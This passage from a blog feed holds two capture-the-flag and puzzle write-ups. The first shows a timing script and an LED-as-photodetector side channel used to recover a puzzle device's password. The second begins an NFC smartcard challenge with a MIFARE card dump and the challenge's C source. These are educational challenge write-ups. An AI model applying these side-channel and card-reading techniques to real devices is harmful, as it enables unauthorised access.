font-style: inherit;">2</span>) </span>
<span id="lst-script-14">        t <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> utime.ticks_cpu() <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> t0</span>
<span id="lst-script-15">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># rest of response</span></span>
<span id="lst-script-16">        ret <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+=</span> u.read(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">49</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span>)</span>
<span id="lst-script-17"></span>
<span id="lst-script-18">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Ignore measurement if the ticks are far off from the expected</span></span>
<span id="lst-script-19">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">300000</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> t <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">400000</span>: </span>
<span id="lst-script-20">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">try</span>:</span>
<span id="lst-script-21">                timings[i][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'data'</span>].append(t)</span>
<span id="lst-script-22">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">except</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">KeyError</span>:</span>
<span id="lst-script-23">                timings[i] <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> {<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'data'</span>: [t], <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'stats'</span>: {<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'avg'</span>: <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'var'</span>: <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'std'</span>: <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>}}</span></code></pre></div>
</div>
</figure>
</div>
<p>Only 21 characters stand out; all other amount of characters result in ~30000 CPU ticks between <code>\r</code> and first reply byte.</p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb17-1">21: {'avg': 397759.9, 'std': 207.689, 'var': 43134.74}</span>
<span id="cb17-2">...</span></code></pre></div>
<p>I used the same script to see if trying sll possible ASCII bytes at all different locations in the 21 character long password resulted in a longer timing, but this did not show anything useful.</p>
<p>Maybe the LED contains some more information? We cannot measure the LED voltage directly, as it is covered in epoxy. I tried making a slowmotion capture for a few tries, but this did not show anything. Maybe some kind of <a href="https://en.wikipedia.org/wiki/Photodetector">photodetector</a> is needed? I don’t have that unfortunately…</p>
<p>After being stuck for a while, my friend Thomas pointed out that you can also use <a href="https://en.wikipedia.org/wiki/LED_circuit#LED_as_a_light_sensor">an LED as a photodetector</a>. Apparently, an LED is sensitive to wavelengths equal to or shorter than the wavelength it emits. I had some yellow LEDs laying around, so this might work!</p>
<div id="fig-led" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-led-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/LED.jpeg" class="img-fluid figure-img" style="width:75.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-led-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;7: Photodetector
</figcaption>
</figure>
</div>
<p>With the LED hooked up to a Picoscope probe, the blink is indeed visible on the scope output:</p>
<div id="fig-led0" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-led0-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/LED-21-0.png" class="img-fluid figure-img" style="width:75.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-led0-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;8: LED measurement <code>AAAAAAAAAAAAAAAAAAAAA</code>
</figcaption>
</figure>
</div>
<p>And, with the script in Listing&nbsp;1 to run through all the possible bytes, and checking what shows up on the scope, the blink gets slightly longer for one of the bytes:</p>
<div id="fig-led0" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-led0-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/LED-21-1.png" class="img-fluid figure-img" style="width:75.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-led0-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;9: LED measurement <code>TAAAAAAAAAAAAAAAAAAAA</code>
</figcaption>
</figure>
</div>
<p>And, once we get all 21 bytes correct, the blink is the longest:</p>
<div id="fig-led0" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-led0-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/LED-21-21.png" class="img-fluid figure-img" style="width:75.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-led0-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;10: LED measurement <code>T1me_i5_not_c0nstant^</code>
</figcaption>
</figure>
</div>
<p>This shows that the password is <code>T1me_i5_not_c0nstant^</code>, which indeed gives us the next output:</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb18-1">Password is correct!</span>
<span id="cb18-2">Updating current time...</span>
<span id="cb18-3">Lagavulin 16 is an exquisite whiskey - wait until 2057 to let it age until 50 YO. See you later!</span>
<span id="cb18-4">Lagavulin 16 is an exquisite whiskey - wait until 2057 to let it age until 50 YO. See you later!</span>
<span id="cb18-5">Lagavulin 16 is an exquisite whiskey - wait until 2057 to let it age until 50 YO. See you later!</span>
<span id="cb18-6">Lagavulin 1Lagavulin 16 is an exquisite whiskey - wait until 2057 to let it age until 50 YO. See you later!</span>
<span id="cb18-7">Lagavulin 16 is an exquisite whiskey - wait until 2057 to let it age until 50 YO. See you later!</span>
<span id="cb18-8">Lagavulin 16 is an exquisite whiskey - wait until 2057 to let it age until 50 YO. See you later!</span>
<span id="cb18-9">Lagavulin 16 is an exquisite whiskey - wait until 2057 to let it age until 50 YO. See you later!</span>
<span id="cb18-10">Lagavulin 16 is an exquisite whiskey - wait until 2057 to let it age until 50 YO. See you later!</span>
<span id="cb18-11">LagaLagavulin 16 is an exquisite whiskey - wait until 2057 to let it age until 50 YO. See you later!</span>
<span id="cb18-12">LLagavulin 16 is an exquisite whiskey - wait until 2057 to let it age until 50 YO. See you later!</span>
<span id="cb18-13">Lagavulin 16 is an exquisite whiskey - wait until 2057 to let it age until 50 YO. See you later!</span>
<span id="cb18-14">LaLagavulin 16 </span>
<span id="cb18-15">...</span></code></pre></div>
<p>A date! This brings us back to the HTTP request from earlier. Maybe if we set the year to 2057, we move on?</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb19-1">Welcome! Curent time: 2057-11-16 22:44:13 . Have you thought how much time you wasted solving this?</span>
<span id="cb19-2">I chose a number.</span>
<span id="cb19-3">What number is it?</span>
<span id="cb19-4">&gt; �3567898</span>
<span id="cb19-5"></span>
<span id="cb19-6">NaN</span>
<span id="cb19-7">I chose a number.</span>
<span id="cb19-8">What number is it?</span>
<span id="cb19-9">&gt; 3567898</span>
<span id="cb19-10"></span>
<span id="cb19-11">Finally!</span>
<span id="cb19-12"></span>
<span id="cb19-13">You have guessed the number correctly!</span>
<span id="cb19-14">Enter password to authenticate:</span>
<span id="cb19-15">&gt; T1me_i5_not_c0nstant^</span>
<span id="cb19-16"></span>
<span id="cb19-17">Password is correct!</span>
<span id="cb19-18">Updating current time...</span>
<span id="cb19-19">Finally, it is year 2057! Send me a text, and let's have some whiskey!</span>
<span id="cb19-20">https://drive.google.com/file/d/14QkjdSn_cTc_aWjrnAiFNW-FRLCPN9_7/view</span>
<span id="cb19-21">https://drive.google.com/file/d/14QkjdSn_cTc_aWjrnAiFNW-FRLCPN9_7/view</span>
<span id="cb19-22">...</span></code></pre></div>
<p>Yes! The link provides a picture, leading us to some treasure?</p>
<div id="fig-treasure0" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-treasure0-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/PXL_20230928_175547160~3.jpg" class="img-fluid figure-img" style="width:75.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-treasure0-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;11: Treasure?
</figcaption>
</figure>
</div>
<p>A bottle!</p>
<div id="fig-treasure1" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-treasure1-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/IMG_20240410_093929_083.jpg" class="img-fluid figure-img" style="width:75.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-treasure1-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;12: Treasure!
</figcaption>
</figure>
</div>
<p>Lagavulin 16!</p>
<div id="fig-treasure2" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-treasure2-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/photo_2024-04-11_12-02-56.jpg" class="img-fluid figure-img" style="width:75.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-treasure2-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;13: Whiskey!
</figcaption>
</figure>
</div>
</section>
<section id="tools-used" class="level1">
<h1>Tools used</h1>
<ul>
<li>Laptop</li>
<li>Hakko FX-888D</li>
<li>Picoscope 2204A</li>
<li>Andonstar AD208</li>
</ul>


</section>


<div id="quarto-appendix" class="default"><section id="footnotes" class="footnotes footnotes-end-of-document"><h2 class="anchored quarto-appendix-heading">Footnotes</h2>

<ol>
<li id="fn1"><p>But it does not actually reboot, just hang :(↩︎</p></li>
</ol>
</section></div> ]]></description>
  <guid>https://nilswiersma.github.io/2024/sergei23/sergei23.html</guid>
  <pubDate>Fri, 12 Apr 2024 22:00:00 GMT</pubDate>
  <media:content url="https://nilswiersma.github.io/2024/sergei23/figs/epoxy.jpg" medium="image" type="image/jpeg"/>
</item>
<item>
  <title>Ninja Cards</title>
  <link>https://nilswiersma.github.io/2023/hexacon23/hexacon23.html</link>
  <description><![CDATA[ 




<section id="intro" class="level1">
<h1>Intro</h1>
<p>At the 2023 edition of <a href="https://www.hexacon.fr/">hexacon</a> there were various CTF challenges, one of which organized at the venue by the event’s organizer, Synacktiv. It involved a smartcard reader attached to small computer and a screen, and a stack of smartcards. The goal of the challenge is to somehow authenticate as admin, which should pop up a specific message on the screen that shows “Waiting for NFC tag…” in Figure&nbsp;1.</p>
<div id="fig-setup" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-setup-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2023/hexacon23/figs/setup.jpg" class="img-fluid figure-img">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-setup-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;1: CTF setup
</figcaption>
</figure>
</div>
<p>We grabbed one card from the stack on the bottom left and read it out using <a href="https://f-droid.org/packages/de.syss.MifareClassicTool/">MIFARE Classic Tool</a>. Fortunately it used one of the standard keys included in the application. The dump showed some data in sectors 1, 2 and 3 as shown in Figure&nbsp;2.</p>
<div id="fig-card" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-card-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2023/hexacon23/figs/card.png" class="img-fluid figure-img" style="width:50.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-card-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;2: Card contents
</figcaption>
</figure>
</div>
<p>The sectors 1 and 3 contain some interesting strings as shown in Listing&nbsp;1.</p>
<div id="lst-card1" class="default listing quarto-float">
<figure class="quarto-float quarto-float-lst figure">
<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-lst" id="lst-card1-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Listing&nbsp;1: Data in card
</figcaption>
<div aria-describedby="lst-card1-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<div class="sourceCode" id="lst-card1" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="lst-card1-1">0000  68 65 78 61 63 6f 6e 5f  67 75 65 73 74 00 00 00  |hexacon_guest...|</span>
<span id="lst-card1-2">0010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span>
<span id="lst-card1-3">*</span>
<span id="lst-card1-4">0030  ff ff ff ff ff ff ff 07  80 69 ff ff ff ff ff ff  |.........i......|</span>
<span id="lst-card1-5">0040  0b 5f 6a 80 4d ad d1 4b  53 14 58 58 f2 6b 7d f0  |._j.M..KS.XX.k}.|</span>
<span id="lst-card1-6">0050  ba 62 dd 2f 89 44 0e 14  5c 35 2b db 00 c8 09 0a  |.b./.D..\5+.....|</span>
<span id="lst-card1-7">0060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span>
<span id="lst-card1-8">0070  ff ff ff ff ff ff ff 07  80 69 ff ff ff ff ff ff  |.........i......|</span>
<span id="lst-card1-9">0080  68 74 74 70 73 3a 2f 2f  74 69 6e 79 75 72 6c 2e  |https://tinyurl.|</span>
<span id="lst-card1-10">0090  63 6f 6d 2f 33 6e 76 6d  66 65 61 75 00 00 00 00  |com/3nvmfeau....|</span>
<span id="lst-card1-11">00a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span>
<span id="lst-card1-12">00b0  ff ff ff ff ff ff ff 07  80 69 ff ff ff ff ff ff  |.........i......|</span></code></pre></div>
</div>
</figure>
</div>
<p>The <a href="https://tinyurl.com/3nvmfeau">URL</a> brings us to a zip archive containing files shown in Listing&nbsp;2. This is a subset of the code running on the small computer, handling the data read from the card’s sectors.</p>
<div id="lst-archive" class="default listing quarto-float">
<figure class="quarto-float quarto-float-lst figure">
<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-lst" id="lst-archive-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Listing&nbsp;2: Archive contents
</figcaption>
<div aria-describedby="lst-archive-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<div class="sourceCode" id="lst-archive" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="lst-archive-1">.</span>
<span id="lst-archive-2">├── README.md</span>
<span id="lst-archive-3">└─── src</span>
<span id="lst-archive-4"> &nbsp;&nbsp; ├── include</span>
<span id="lst-archive-5"> &nbsp;&nbsp; │&nbsp;&nbsp; ├── ipc.h</span>
<span id="lst-archive-6"> &nbsp;&nbsp; │&nbsp;&nbsp; ├── main.h</span>
<span id="lst-archive-7"> &nbsp;&nbsp; │&nbsp;&nbsp; ├── nfc.h</span>
<span id="lst-archive-8"> &nbsp;&nbsp; │&nbsp;&nbsp; └── util.h</span>
<span id="lst-archive-9"> &nbsp;&nbsp; ├── main.c</span>
<span id="lst-archive-10"> &nbsp;&nbsp; └── util.c</span></code></pre></div>
</div>
</figure>
</div>
<p>The <code>README.md</code> explains the challenge:</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb1-1">Dear Hexacon guest,</span>
<span id="cb1-2"></span>
<span id="cb1-3">If you read these lines, you probably visited the Synacktiv stand </span>
<span id="cb1-4">and some ninjas might have briefed you.</span>
<span id="cb1-5"></span>
<span id="cb1-6">Otherwise, the goal is to exploit vulnerabilities inside the NFC </span>
<span id="cb1-7">reader to authenticate successfully as admin.</span>
<span id="cb1-8"></span>
<span id="cb1-9">The sources of the challenge are available into the `src/` directory.</span>
<span id="cb1-10"></span>
<span id="cb1-11">NB: Some files such as `ipc.c` and `nfc.C` which implement some </span>
<span id="cb1-12">used functions are not part of the archive, this is intended, as </span>
<span id="cb1-13">they are not needed to complete the challenge.</span>
<span id="cb1-14"></span>
<span id="cb1-15">Have fun ! o/</span></code></pre></div>
<p>The <code>main</code> (Listing&nbsp;3) of the application, initializes an admin token stored in the filesystem of the machine with <code>get_admin_token</code> and then enters a reading loop. When presented a card, the <code>notify</code> calls update messages on the screen.</p>
<div id="lst-main" class="C listing quarto-float">
<figure class="quarto-float quarto-float-lst figure">
<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-lst" id="lst-main-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Listing&nbsp;3: <code>main</code> and <code>get_admin_token</code> functions
</figcaption>
<div aria-describedby="lst-main-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<div class="sourceCode" id="lst-main" style="background: #f1f3f5;"><pre class="sourceCode C code-with-copy"><code class="sourceCode c"><span id="lst-main-1"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">#include </span><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">"main.h"</span></span>
<span id="lst-main-2"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">#include </span><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">"util.h"</span></span>
<span id="lst-main-3"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">#include </span><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">"nfc.h"</span></span>
<span id="lst-main-4"></span>
<span id="lst-main-5"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">uint8_t</span> admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span>TOKEN_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="lst-main-6"></span>
<span id="lst-main-7">context_t context<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-main-8"></span>
<span id="lst-main-9"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">uint8_t</span> key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span>KEY_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="lst-main-10"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">uint32_t</span> iterations<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-main-11"></span>
<span id="lst-main-12"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">int</span> main<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">int</span> argc<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">char</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>argv<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[])</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-main-13"></span>
<span id="lst-main-14">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// Retrieve secret</span></span>
<span id="lst-main-15">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>get_admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-main-16">        printf<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"[-] Failed to retrieve secret</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-17">        notify<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>UNEXPECTED_FAIL<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-18">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-main-19">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-main-20"></span>
<span id="lst-main-21">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(;;)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-main-22"></span>
<span id="lst-main-23">        iterations <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1000</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-main-24"></span>
<span id="lst-main-25">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// Retrieve NFC card username</span></span>
<span id="lst-main-26">        read_card<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(&amp;</span>context<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-27"></span>
<span id="lst-main-28">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>derive_key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> iterations<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-main-29">            notify<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>UNEXPECTED_FAIL<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-30">            sleep<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-31">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">continue</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-main-32">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-main-33"></span>
<span id="lst-main-34">        status_t status <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> check_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(&amp;</span>context<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-35"></span>
<span id="lst-main-36">        notify<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>status<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-37"></span>
<span id="lst-main-38">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>status <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> VALID_TOKEN<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-main-39">            sleep<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-40"></span>
<span id="lst-main-41">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(!</span>strcmp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>context<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>username<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> ADMIN_USERNAME<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-main-42">                notify<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>ADMIN_AUTH<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-43">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">else</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-main-44">                notify<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>GUEST_AUTH<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-45">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-main-46"></span>
<span id="lst-main-47">            sleep<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-48">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-main-49"></span>
<span id="lst-main-50">        sleep<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-51">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-main-52"></span>
<span id="lst-main-53">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-main-54"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-main-55"></span>
<span id="lst-main-56"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">int</span> get_admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">char</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="lst-main-57"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
